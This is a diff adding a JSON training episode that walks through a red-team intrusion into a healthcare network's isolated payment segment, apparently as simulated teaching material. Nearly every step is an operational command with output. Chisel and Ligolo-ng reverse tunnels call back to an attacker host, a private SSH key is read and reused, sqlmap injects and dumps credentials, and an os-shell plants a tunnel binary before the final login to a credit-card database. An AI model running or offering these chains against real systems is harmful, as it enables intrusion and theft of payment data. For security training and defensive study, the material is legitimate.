@@ -1,0 +1,99 @@
+{
+  "title": "Episode 2: Multi-Hop Pivoting Through Segmented Network",
+  "scenario": "Red team engagement against a healthcare organization with heavily segmented network architecture. Initial compromise on public-facing application server (10.10.10.50) in DMZ. Target is isolated PCI-DSS compliant payment processing network (172.16.100.0/24) separated by multiple network segments: DMZ -> Management VLAN (192.168.10.0/24) -> Internal Server VLAN (172.16.5.0/24) -> Payment Network (172.16.100.0/24). Objective: Chain multiple pivots to reach payment processing servers.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Setup initial pivot from DMZ to Management VLAN",
+      "command": "chisel server --port 8080 --reverse\n\n[On DMZ host 10.10.10.50]:\n./chisel client 10.10.14.50:8080 R:1080:socks",
+      "output": "Chisel server listening on 10.10.14.50:8080\nClient connected from 10.10.10.50\n\nReverse SOCKS tunnel: 127.0.0.1:1080\nAccess to DMZ internal interface: 192.168.10.0/24",
+      "explanation": "Established first hop using Chisel reverse tunnel - DMZ host to Management VLAN"
+    },
+    {
+      "step": 2,
+      "description": "Discover Management VLAN network through first pivot",
+      "command": "proxychains nmap -sT -Pn -p 22,80,3389,5985 192.168.10.0/24 --top-ports 20",
+      "output": "192.168.10.10 - SSH, HTTP (Linux management server)\n192.168.10.20 - WinRM, RDP (Windows admin server)\n192.168.10.50 - SSH (Database management)\n\n3 management hosts discovered",
+      "explanation": "Scanned Management VLAN through first pivot, found admin and database management servers"
+    },
+    {
+      "step": 3,
+      "description": "Compromise Linux management server with SSH key reuse",
+      "command": "cat /home/appuser/.ssh/id_rsa\n\nssh -i dmz_key -D 1081 appuser@192.168.10.10 -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p'",
+      "output": "SSH connection successful through SOCKS proxy\nappuser@mgmt-linux-01:~$ ip addr\neth0: 192.168.10.10/24\neth1: 172.16.5.5/24\n\nSecond pivot point acquired - dual-homed into Server VLAN",
+      "explanation": "Found reused SSH key on DMZ host, used it to access management server which connects to Server VLAN"
+    },
+    {
+      "step": 4,
+      "description": "Setup double SSH tunnel chain for Server VLAN access",
+      "command": "ssh -L 8888:192.168.10.10:22 user@10.10.10.50 -N -f\nssh -L 1082:127.0.0.1:1082 -D 1082 appuser@127.0.0.1 -p 8888 -N -f",
+      "output": "Double tunnel established:\n  Hop 1: Attacker -> 10.10.10.50 (DMZ)\n  Hop 2: Attacker -> 192.168.10.10 (Management)\n\nSOCKS proxy on 127.0.0.1:1082 -> Server VLAN (172.16.5.0/24)",
+      "explanation": "Created SSH tunnel chain through both pivot points to reach Server VLAN"
+    },
+    {
+      "step": 5,
+      "description": "Scan Server VLAN for payment gateway",
+      "command": "proxychains -f proxychains2.conf nmap -sT -Pn 172.16.5.0/24 -p 1433,3306,5432,8080,8443\n\n[proxychains2.conf]:\nsocks5 127.0.0.1 1082",
+      "output": "172.16.5.10 - MySQL (3306) - Database server\n172.16.5.20 - HTTPS (8443) - Payment gateway API\n172.16.5.50 - MSSQL (1433) - Transaction database\n\nPayment gateway at 172.16.5.20",
+      "explanation": "Discovered payment processing servers through second pivot hop"
+    },
+    {
+      "step": 6,
+      "description": "Deploy Ligolo-ng for stable layer-3 tunnel to Server VLAN",
+      "command": "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n[On 192.168.10.10 via SSH]:\n./agent -connect 10.10.14.50:11601 -ignore-cert",
+      "output": "Ligolo-ng agent connected\nSession ID: 1\nInterfaces:\n  eth1: 172.16.5.5/24\n\nAdded route: sudo ip route add 172.16.5.0/24 dev ligolo\nTunnel started\n\nDirect IP access to Server VLAN - no SOCKS needed",
+      "explanation": "Deployed Ligolo-ng for true layer-3 routing, eliminating need for proxychains"
+    },
+    {
+      "step": 7,
+      "description": "Exploit SQL injection in payment gateway",
+      "command": "sqlmap -u 'https://172.16.5.20:8443/api/transaction?id=1' --dbms=mysql --technique=T --level=3 --risk=2 --batch",
+      "output": "[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'\n[INFO] POST parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable\n\navailable databases [3]:\n[*] information_schema\n[*] mysql  \n[*] payment_db\n\nSQL injection confirmed!",
+      "explanation": "Found time-based blind SQLi in payment API, direct access via Ligolo tunnel"
+    },
+    {
+      "step": 8,
+      "description": "Extract database credentials and pivot information",
+      "command": "sqlmap -u 'https://172.16.5.20:8443/api/transaction?id=1' -D payment_db -T config --dump",
+      "output": "Database: payment_db\nTable: config\n[3 entries]\n+----+------------------+----------------------+\n| id | config_key       | config_value         |\n+----+------------------+----------------------+\n| 1  | db_host          | 172.16.100.10        |\n| 2  | db_user          | payment_processor    |\n| 3  | db_pass          | 3ncrypt3dP@ym3nt!123 |\n+----+------------------+----------------------+\n\nPayment database at 172.16.100.10 - isolated network!",
+      "explanation": "Extracted configuration revealing third network segment for payment processing database"
+    },
+    {
+      "step": 9,
+      "description": "Check if payment gateway can reach payment network",
+      "command": "sqlmap -u 'https://172.16.5.20:8443/api/transaction?id=1' --os-shell",
+      "output": "os-shell> ip addr show\neth0: 172.16.5.20/24\neth1: 172.16.100.5/24\n\nos-shell> ping -c 1 172.16.100.10\n1 packets transmitted, 1 received\n\nPayment gateway is third pivot point!",
+      "explanation": "Payment gateway server is tri-homed with connection to isolated payment network"
+    },
+    {
+      "step": 10,
+      "description": "Deploy third-hop tunnel through payment gateway",
+      "command": "[Upload chisel to payment gateway via SQLMap file upload]\nsqlmap -u 'https://172.16.5.20:8443/api/transaction?id=1' --file-write=/root/chisel --file-dest=/tmp/chisel\n\nos-shell> chmod +x /tmp/chisel\nos-shell> /tmp/chisel client 10.10.14.50:8081 R:1083:socks &",
+      "output": "Chisel client connected from 172.16.5.20\n\nThird SOCKS proxy: 127.0.0.1:1083 -> 172.16.100.0/24\n\nNetwork topology:\n  Attacker (10.10.14.50)\n    | Chisel tunnel\n  DMZ (10.10.10.50 -> 192.168.10.0/24)\n    | SSH tunnel  \n  Management (192.168.10.10 -> 172.16.5.0/24)\n    | SQLMap shell\n  Payment Gateway (172.16.5.20 -> 172.16.100.0/24)\n    |\n  Payment Network (172.16.100.0/24)",
+      "explanation": "Established three-hop pivot chain reaching isolated PCI-DSS payment network"
+    },
+    {
+      "step": 11,
+      "description": "Access payment database through triple-hop pivot",
+      "command": "proxychains -f proxychains3.conf mysql -h 172.16.100.10 -u payment_processor -p'3ncrypt3dP@ym3nt!123'\n\n[proxychains3.conf]:\nsocks5 127.0.0.1 1083",
+      "output": "Welcome to the MySQL monitor.\nmysql> SELECT DATABASE();\n+--------------------+\n| payment_production |\n+--------------------+\n\nmysql> SHOW TABLES;\n+-----------------------+\n| credit_cards          |\n| transactions          |\n| customer_data         |\n+-----------------------+\n\nmysql> SELECT COUNT(*) FROM credit_cards;\n+----------+\n|   125743 |\n+----------+\n\nDirect access to payment database!",
+      "explanation": "Successfully pivoted through three network segments to reach isolated payment database"
+    },
+    {
+      "step": 12,
+      "description": "Document full pivot chain for reporting",
+      "command": "cat > pivot_chain.txt << 'EOF'\nPivot Chain Summary:\n\n1. Initial Access: DMZ App Server (10.10.10.50)\n   Method: Web application vulnerability\n   Tunnel: Chisel reverse SOCKS (port 1080)\n\n2. First Pivot: Management VLAN (192.168.10.0/24)\n   Access: SSH with reused key to 192.168.10.10\n   Tunnel: SSH dynamic forward + Ligolo-ng (port 1082)\n\n3. Second Pivot: Server VLAN (172.16.5.0/24)  \n   Access: SQL injection on payment gateway (172.16.5.20)\n   Tunnel: Chisel via SQLMap shell (port 1083)\n\n4. Final Target: Payment Network (172.16.100.0/24)\n   Access: MySQL database (172.16.100.10)\n   Credentials: payment_processor / 3ncrypt3dP@ym3nt!123\n\nData: 125,743 credit card records accessible\nEOF",
+      "output": "Pivot documentation created\n\nKey findings:\n- 4 network segments traversed\n- 3 pivot points chained\n- Multiple tunnel technologies combined\n- PCI-DSS network isolation bypassed\n- Full access to payment processing database",
+      "explanation": "Documented complete multi-hop pivot chain for red team report"
+    }
+  ],
+  "outcome": "Successfully demonstrated complete bypass of network segmentation by chaining three pivot points across four network segments. Reached PCI-DSS isolated payment processing network from external position. Accessed production payment database with 125,000+ credit card records. Proved that network segmentation alone is insufficient without proper monitoring and access controls.",
+  "learning_objectives": [
+    "Chain multiple pivot points across network segments",
+    "Combine different tunneling technologies (Chisel, SSH, Ligolo-ng)",
+    "Navigate heavily segmented enterprise networks",
+    "Identify and leverage multi-homed pivot points",
+    "Use SQLMap for pivoting through compromised web applications",
+    "Document complex pivot chains for reporting"
+  ]
+}
